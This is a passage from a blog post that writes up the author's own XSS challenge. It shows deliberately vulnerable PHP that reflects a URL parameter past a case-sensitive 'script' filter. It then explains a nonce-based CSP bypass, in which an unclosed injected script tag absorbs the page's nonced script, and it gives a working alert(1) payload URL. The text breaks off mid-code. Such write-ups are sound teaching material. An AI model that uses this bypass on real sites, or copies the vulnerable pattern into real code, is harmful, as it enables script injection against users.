<!DOCTYPE html><html><head><title>Alain's Blog | My first XSS challenge - Writeup</title><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0"><meta name="robots" content="index,follow"><meta name="theme-color" content="#212121"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><link rel="shortcut icon" href="/blog/favicon.ico"><link href="https://fonts.googleapis.com/css?family=Hind:400,700&amp;display=swap" rel="stylesheet"><link href="https://fonts.googleapis.com/css?family=Source+Code+Pro:300,400&amp;display=swap" rel="stylesheet"><link href="https://fonts.googleapis.com/icon?family=Material+Icons%7CMaterial+Icons+Outlined&amp;display=swap" rel="stylesheet"><style>
      body, input, button {
        font-family: 'Hind', sans-serif;
      }

      code, .hljs {
        font-family: 'Source Code Pro', 'Courier New', Courier, monospace;
      }

      .icon-font {
        font-family: 'Material Icons';
        font-weight: normal;
        font-style: normal;
        font-size: 24px;  /* Preferred icon size */
        display: inline-block;
        line-height: 1;
        text-transform: none;
        letter-spacing: normal;
        word-wrap: normal;
        white-space: nowrap;
        direction: ltr;
      
        /* Support for all WebKit browsers. */
        -webkit-font-smoothing: antialiased;
        /* Support for Safari and Chrome. */
        text-rendering: optimizeLegibility;
      
        /* Support for Firefox. */
        -moz-osx-font-smoothing: grayscale;
      
        /* Support for IE. */
        font-feature-settings: 'liga';
      }

      .icon-font.outline {
        font-family: 'Material Icons Outlined';
      }
    </style><link href="/blog/styles/codedoc-styles.css" rel="stylesheet"><script async="" defer="" src="/blog/bundle/codedoc-bundle.js"></script><script>window.githubConfig={"repo":"blog","user":"krial057"}</script><style>.container{padding-top: 0 !important}</style><style>#-codedoc-toc { backdrop-filter: blur(16px); -webkit-backdrop-filter: blur(16px) }</style><meta name="twitter:title" content="Alain's Blog | My first XSS challenge - Writeup"><meta property="og:type" content="article"><meta property="og:title" content="Alain's Blog | My first XSS challenge - Writeup"><meta name="keywords" content=""><meta property="blog-tags" content=""></head><body><div class="header-0-0-3"></div><div id="-codedoc-container" class="container"><script>window.source = {"base":"posts","path":"own-xss-challenge.md","namespace":"/blog","title":{"base":"Alain's Blog","connector":" | "}}</script><h1 class="h-0-0-9 white"><span style=" 
      text-shadow: 0 0 8px black; 
      font-size: 48px"><p>My first XSS challenge - Writeup</p></span></h1><script id="koNiCzqScE">(function(){function load(){if (window.__sdh_transport){window.__sdh_transport("koNiCzqScE", "tvU4ZvTyVzKC9UotaYeV1w==", {"name":"Alain","date":"14/09/2020"});} }; if (document.readyState == 'complete') load(); else window.addEventListener('load', load); })()</script><marker><br>

</marker><h1 id="the-challenge" class="heading-0-0-10"><span class="anchor-0-0-11" data-ignore-text=""><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span>The challenge</h1><p>Two weeks ago I created <a href="https://twitter.com/krial057/status/1300423121351184384">my first XSS challenge</a>. A XSS challenge is similar to a <a href="https://ctftime.org/ctf-wtf/">CTF challenge</a>. Whereas CTF challenges usually consist of complete Websites without a clear goal, a XSS challenge is usually short and the goal is to execute arbitrary Javascript code.</p><p>The main obstacle of my XSS challenge consisted of bypassing the <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">CSP</a>.</p><h2 id="source-code" class="heading-0-0-10"><span class="anchor-0-0-11" data-ignore-text=""><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span>Source Code</h2><p>The challenge source code was public, so no hidden secrets to find. The following is a shortened version of the challenge source code:</p><pre class="with-bar"><code class="php -codedoc-code-snippet code-0-0-12" tabindex="0"><span class="wmbar-0-0-15"><span></span><span></span><span></span><span>index.php</span></span><div class="line-0-0-14  -codedoc-code-line" data-content="<?php " id="code1-l1"><span class="lineCounter-0-0-13 prim -codedoc-line-counter">1<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> </span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="  $nonce = base64_encode(random_bytes(32));" id="code1-l2"><span class="lineCounter-0-0-13 -codedoc-line-counter">2<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>  <span class="token variable">$nonce</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">random_bytes</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="  header(&quot;Content-Security-Policy: default-src 'none'; script-src 'nonce-&quot;.$nonce.&quot;'&quot;); // --> Only allow script execution with the right nonce token" id="code1-l3"><span class="lineCounter-0-0-13 -codedoc-line-counter">3<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>  <span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Content-Security-Policy: default-src 'none'; script-src 'nonce-"</span><span class="token punctuation">.</span><span class="token variable">$nonce</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// --&gt; Only allow script execution with the right nonce token</span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="?>" id="code1-l4"><span class="lineCounter-0-0-13 -codedoc-line-counter">4<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span><span class="token delimiter important">?&gt;</span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="<html>" id="code1-l5"><span class="lineCounter-0-0-13 prim -codedoc-line-counter">5<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="    <body>" id="code1-l6"><span class="lineCounter-0-0-13 -codedoc-line-counter">6<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="        <?php" id="code1-l7"><span class="lineCounter-0-0-13 -codedoc-line-counter">7<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>        <span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="            $todos = '';" id="code1-l8"><span class="lineCounter-0-0-13 -codedoc-line-counter">8<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>            <span class="token variable">$todos</span> <span class="token operator">=</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">;</span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="            $todos = $todos.&quot;<div> Todo #1 </div>\n&quot;; // --> A constant TODO" id="code1-l9"><span class="lineCounter-0-0-13 -codedoc-line-counter">9<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>            <span class="token variable">$todos</span> <span class="token operator">=</span> <span class="token variable">$todos</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;div&gt; Todo #1 &lt;/div&gt;\n"</span><span class="token punctuation">;</span> <span class="token comment">// --&gt; A constant TODO</span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="            $todos = $todos.&quot;<div> Todo #2 </div>\n&quot;; // --> A constant TODO" id="code1-l10"><span class="lineCounter-0-0-13 prim -codedoc-line-counter">10<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>            <span class="token variable">$todos</span> <span class="token operator">=</span> <span class="token variable">$todos</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;div&gt; Todo #2 &lt;/div&gt;\n"</span><span class="token punctuation">;</span> <span class="token comment">// --&gt; A constant TODO</span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="            $todos = $todos.&quot;<div> &quot;.$_GET['todo'].&quot; </div>\n&quot;; // --> A TODO supplied by the user over url" id="code1-l11"><span class="lineCounter-0-0-13 -codedoc-line-counter">11<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>            <span class="token variable">$todos</span> <span class="token operator">=</span> <span class="token variable">$todos</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;div&gt; "</span><span class="token punctuation">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'todo'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token double-quoted-string string">" &lt;/div&gt;\n"</span><span class="token punctuation">;</span> <span class="token comment">// --&gt; A TODO supplied by the user over url</span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="            $todo_list = explode(&quot;\n&quot;, $todos);" id="code1-l12"><span class="lineCounter-0-0-13 -codedoc-line-counter">12<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>            <span class="token variable">$todo_list</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"\n"</span><span class="token punctuation">,</span> <span class="token variable">$todos</span><span class="token punctuation">)</span><span class="token punctuation">;</span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="            foreach($todo_list as $todo) {" id="code1-l13"><span class="lineCounter-0-0-13 -codedoc-line-counter">13<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>            <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$todo_list</span> <span class="token keyword">as</span> <span class="token variable">$todo</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="                if(strpos($todo, &quot;script&quot;) === false) { // --> Don't allow script injections in todos" id="code1-l14"><span class="lineCounter-0-0-13 -codedoc-line-counter">14<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$todo</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"script"</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token boolean constant">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// --&gt; Don't allow script injections in todos</span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="                    echo $todo.&quot;\n&quot;;" id="code1-l15"><span class="lineCounter-0-0-13 prim -codedoc-line-counter">15<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>                    <span class="token keyword">echo</span> <span class="token variable">$todo</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"\n"</span><span class="token punctuation">;</span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="                } " id="code1-l16"><span class="lineCounter-0-0-13 -codedoc-line-counter">16<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>                <span class="token punctuation">}</span> </div><br><div class="line-0-0-14  -codedoc-code-line" data-content="            }" id="code1-l17"><span class="lineCounter-0-0-13 -codedoc-line-counter">17<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>            <span class="token punctuation">}</span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="        ?>" id="code1-l18"><span class="lineCounter-0-0-13 -codedoc-line-counter">18<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>        <span class="token delimiter important">?&gt;</span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="" id="code1-l19"><span class="lineCounter-0-0-13 -codedoc-line-counter">19<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="        <script nonce=&quot;<?php echo $nonce ?>&quot;>" id="code1-l20"><span class="lineCounter-0-0-13 prim -codedoc-line-counter">20<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">nonce</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$nonce</span> <span class="token delimiter important">?&gt;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"></span></span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="                console.log(&quot;bla&quot;)" id="code1-l21"><span class="lineCounter-0-0-13 -codedoc-line-counter">21<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>                console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"bla"</span><span class="token punctuation">)</span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="        </script>" id="code1-l22"><span class="lineCounter-0-0-13 -codedoc-line-counter">22<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="    </body>" id="code1-l23"><span class="lineCounter-0-0-13 -codedoc-line-counter">23<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="</html>" id="code1-l24"><span class="lineCounter-0-0-13 prim -codedoc-line-counter">24<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span></div><br></code></pre><h1 id="the-solution" class="heading-0-0-10"><span class="anchor-0-0-11" data-ignore-text=""><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span>The solution</h1><h2 id="baby-steps" class="heading-0-0-10"><span class="anchor-0-0-11" data-ignore-text=""><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span>Baby steps</h2><p>The first thing one should notice is the possibilty to inject arbitrary html using the todo parameter:</p><pre class=""><code class="php -codedoc-code-snippet code-0-0-12" tabindex="0"><span class="wmbar-0-0-15"><span></span><span></span><span></span><span></span></span><div class="line-0-0-14  -codedoc-code-line" data-content="$todos = $todos.&quot;<div> &quot;.$_GET['todo'].&quot; </div>\n&quot;; // --> arbitrary HTML injection using ?todo=own_html" id="code2-l1"><span class="lineCounter-0-0-13 prim -codedoc-line-counter">1<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span><span class="token variable">$todos</span> <span class="token operator">=</span> <span class="token variable">$todos</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;div&gt; "</span><span class="token punctuation">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'todo'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token double-quoted-string string">" &lt;/div&gt;\n"</span><span class="token punctuation">;</span> <span class="token comment">// --&gt; arbitrary HTML injection using ?todo=own_html</span></div><br></code></pre><p>People not knowing about <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">CSP</a> probably think they could simply provide a <code>script</code> element with arbitrary JS. The script tag filter <code>if(strpos($todo, "script") === false)</code> could easily be bypassed using <code>SCRIPT</code> instead of <code>script</code>. However, giving it a try we get the following error in the console:</p><pre class="with-bar"><code class="js -codedoc-code-snippet code-0-0-12" tabindex="0"><span class="wmbar-0-0-15"><span></span><span></span><span></span><span>index.php?todo=&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;</span></span><div class="line-0-0-14  -codedoc-code-line" data-content="/*~*/ Refused to execute inline script because it violates /*~*/" id="code3-l1"><span class="lineCounter-0-0-13 prim -codedoc-line-counter">1<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span><span class="token comment" hidden="">/*~*/</span><span class="error"> Refused to execute inline script because it violates <span class="wave">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span></span><span class="token comment" hidden="">/*~*/</span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="/*~*/ the following Content Security Policy directive: /*~*/" id="code3-l2"><span class="lineCounter-0-0-13 -codedoc-line-counter">2<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span><span class="token comment" hidden="">/*~*/</span><span class="error"> the following Content Security Policy directive<span class="wave">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span></span><span class="token operator error">:<span class="wave">~</span></span><span class="error"> <span class="wave">~</span></span><span class="token comment" hidden="">/*~*/</span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="/*~*/ &quot;script-src 'nonce-FHFXLGv/SdLkQ9CjBaE8s5wiMR3W1yADF+BjNZE+ZNs='&quot;. /*~*/" id="code3-l3"><span class="lineCounter-0-0-13 -codedoc-line-counter">3<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span><span class="token comment" hidden="">/*~*/</span><span class="error"> <span class="wave">~</span></span><span class="token string error">"script-src 'nonce-FHFXLGv/SdLkQ9CjBaE8s5wiMR3W1yADF+BjNZE+ZNs='"<span class="wave">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span></span><span class="token punctuation error">.<span class="wave">~</span></span><span class="error"> <span class="wave">~</span></span><span class="token comment" hidden="">/*~*/</span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="/*~*/ Either the 'unsafe-inline' keyword, a hash ('sha256-bhHHL3z2vDgxUt0W3dWQOrprscmda2Y5pLsLg4GF+pI='), /*~*/" id="code3-l4"><span class="lineCounter-0-0-13 -codedoc-line-counter">4<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span><span class="token comment" hidden="">/*~*/</span><span class="error"> Either the <span class="wave">~~~~~~~~~~~~</span></span><span class="token string error">'unsafe-inline'<span class="wave">~~~~~~~~~~~~~~~</span></span><span class="error"> keyword<span class="wave">~~~~~~~~</span></span><span class="token punctuation error">,<span class="wave">~</span></span><span class="error"> a <span class="wave">~~~</span></span><span class="token function error">hash<span class="wave">~~~~</span></span><span class="error"> <span class="wave">~</span></span><span class="token punctuation error">(<span class="wave">~</span></span><span class="token string error">'sha256-bhHHL3z2vDgxUt0W3dWQOrprscmda2Y5pLsLg4GF+pI='<span class="wave">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span></span><span class="token punctuation error">)<span class="wave">~</span></span><span class="token punctuation error">,<span class="wave">~</span></span><span class="error"> <span class="wave">~</span></span><span class="token comment" hidden="">/*~*/</span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="/*~*/ or a nonce ('nonce-...') is required to enable inline execution. /*~*/" id="code3-l5"><span class="lineCounter-0-0-13 prim -codedoc-line-counter">5<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span><span class="token comment" hidden="">/*~*/</span><span class="error"> or a <span class="wave">~~~~~~</span></span><span class="token function error">nonce<span class="wave">~~~~~</span></span><span class="error"> <span class="wave">~</span></span><span class="token punctuation error">(<span class="wave">~</span></span><span class="token string error">'nonce-...'<span class="wave">~~~~~~~~~~~</span></span><span class="token punctuation error">)<span class="wave">~</span></span><span class="error"> is required to enable inline execution<span class="wave">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span></span><span class="token punctuation error">.<span class="wave">~</span></span><span class="error"> <span class="wave">~</span></span><span class="token comment" hidden="">/*~*/</span></div><br></code></pre><p>The only possible way to to execute arbitrary javascript is to add a <code>nonce</code> attribute to the <code>script</code> tag that is the same as the one defined in the CSP header. As the nonce is randomly generated on each page refresh, it is impossible to set it in advance.</p><h2 id="getting-the-nonce" class="heading-0-0-10"><span class="anchor-0-0-11" data-ignore-text=""><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span>Getting the nonce</h2><p>So the big question is: how can we add a script tag with a valid nonce before we know the nonce?
Most common techniques are:</p><ul><li>Exfiltrate the nonce somehow and reuse it</li><li>Force the same nonce using a cached version of the site</li><li>Overwrite the base tag</li></ul><p>However, all of these were not possible on my challenge. <code>default-src</code> was set to <code>none</code>, making nonce exfiltration pretty much impossible. Page caching was disabled and there was no script tag with a relative url, that could have been abused by the base tag.</p><p>The main idea was to somehow reuse the same nonce that is already used by the included script. Let's see what would happen if we open a script tag without closing it in front of another script tag:</p><pre class=""><code class="html -codedoc-code-snippet code-0-0-12" tabindex="0"><span class="wmbar-0-0-15"><span></span><span></span><span></span><span></span></span><div class="line-0-0-14 added -codedoc-code-line" data-content=" <script <script nonce=&quot;randomlyGeneratedNonce&quot;>" id="code4-l1"><span class="lineCounter-0-0-13 prim -codedoc-line-counter">1<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">&lt;script</span> <span class="token attr-name">nonce</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>randomlyGeneratedNonce<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"></span></span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="     console.log(&quot;bla&quot;)" id="code4-l2"><span class="lineCounter-0-0-13 -codedoc-line-counter">2<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>     console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"bla"</span><span class="token punctuation">)</span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="</script>" id="code4-l3"><span class="lineCounter-0-0-13 prim -codedoc-line-counter">3<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span></div><br></code></pre><p>Interestingly, the original <code>&lt;script</code> is now considered to be an attribute of our newly injected open script tag.
Even better, we can inject our own attributes inside the script tag that has the correct nonce:</p><pre class=""><code class="html -codedoc-code-snippet code-0-0-12" tabindex="0"><span class="wmbar-0-0-15"><span></span><span></span><span></span><span></span></span><div class="line-0-0-14 added -codedoc-code-line" data-content=" <script id=&quot;yolo&quot; <script nonce=&quot;randomlyGeneratedNonce&quot;>" id="code5-l1"><span class="lineCounter-0-0-13 prim -codedoc-line-counter">1<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>yolo<span class="token punctuation">"</span></span> <span class="token attr-name">&lt;script</span> <span class="token attr-name">nonce</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>randomlyGeneratedNonce<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"></span></span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="    console.log(&quot;bla&quot;)" id="code5-l2"><span class="lineCounter-0-0-13 -codedoc-line-counter">2<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"bla"</span><span class="token punctuation">)</span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="</script>" id="code5-l3"><span class="lineCounter-0-0-13 prim -codedoc-line-counter">3<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span></div><br></code></pre><p>The next big question is, what happens if we provide a <code>src</code> attribute. Will it execute the script provided in the <code>src</code> attribute or will it run, as before, the content (<code>console.log</code>) of the <code>&lt;script&gt;</code> element? Let's try it out in Firefox:</p><pre class=""><code class="html -codedoc-code-snippet code-0-0-12" tabindex="0"><span class="wmbar-0-0-15"><span></span><span></span><span></span><span></span></span><div class="line-0-0-14 added -codedoc-code-line" data-content=" <script src=&quot;data:,alert(1)&quot; <script nonce=&quot;randomlyGeneratedNonce&quot;> /* --> src could also be a URL to a js file and it would also work */" id="code6-l1"><span class="lineCounter-0-0-13 prim -codedoc-line-counter">1<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>data:,alert(1)<span class="token punctuation">"</span></span> <span class="token attr-name">&lt;script</span> <span class="token attr-name">nonce</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>randomlyGeneratedNonce<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"> <span class="token comment">/* --&gt; src could also be a URL to a js file and it would also work */</span></span></span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="    console.log(&quot;bla&quot;)" id="code6-l2"><span class="lineCounter-0-0-13 -codedoc-line-counter">2<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"bla"</span><span class="token punctuation">)</span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="</script>" id="code6-l3"><span class="lineCounter-0-0-13 prim -codedoc-line-counter">3<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span></div><br></code></pre><p>This HTML snippet will actually result in an alert popping up and showing nothing in the console. So <code>src</code>has a higher priority than the actual script element content.</p><p>Perfect, let's try to pop an alert with my challenge:</p><pre class=""><code class="undefined -codedoc-code-snippet code-0-0-12" tabindex="0"><span class="wmbar-0-0-15"><span></span><span></span><span></span><span></span></span><div class="line-0-0-14  -codedoc-code-line" data-content="https://not.lu/challenge?todo=%3cSCRIPT%20src=data:,alert(1)" id="code7-l1"><span class="lineCounter-0-0-13 prim -codedoc-line-counter">1<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>https://not.lu/challenge?todo=%3cSCRIPT%20src=data:,alert(1)</div><br></code></pre><p>But nothing happens. Let's inspect the DOM tree:</p><pre class=""><code class="html -codedoc-code-snippet code-0-0-12" tabindex="0"><span class="wmbar-0-0-15"><span></span><span></span><span></span><span></span></span><div class="line-0-0-14  -codedoc-code-line" data-content="<SCRIPT src=&quot;data:,alert(1)&quot; </div>" id="code8-l1"><span class="lineCounter-0-0-13 prim -codedoc-line-counter">1<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>&lt;SCRIPT src="data:,alert(1)" <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"></span></span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="    <script nonce=&quot;I7ZgzXJRSbrjz5vwVlPSEOGzDxBZVOjPOVJ6WQJkoWU=&quot;>" id="code8-l2"><span class="lineCounter-0-0-13 -codedoc-line-counter">2<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>    <span class="token operator">&lt;</span>script nonce<span class="token operator">=</span><span class="token string">"I7ZgzXJRSbrjz5vwVlPSEOGzDxBZVOjPOVJ6WQJkoWU="</span><span class="token operator">&gt;</span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="      console.log(&quot;test&quot;)" id="code8-l3"><span class="lineCounter-0-0-13 -codedoc-line-counter">3<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">)</span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="</script>" id="code8-l4"><span class="lineCounter-0-0-13 prim -codedoc-line-counter">4<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span></div><br></code></pre><p>The problem is, the todo we add is encapsulated inside a div element:</p><pre class=""><code class="php -codedoc-code-snippet code-0-0-12" tabindex="0"><span class="wmbar-0-0-15"><span></span><span></span><span></span><span></span></span><div class="line-0-0-14  -codedoc-code-line" data-content="$todos = $todos.&quot;<div> &quot;.$_GET['todo'].&quot; </div>\n&quot;;" id="code9-l1"><span class="lineCounter-0-0-13 prim -codedoc-line-counter">1<span 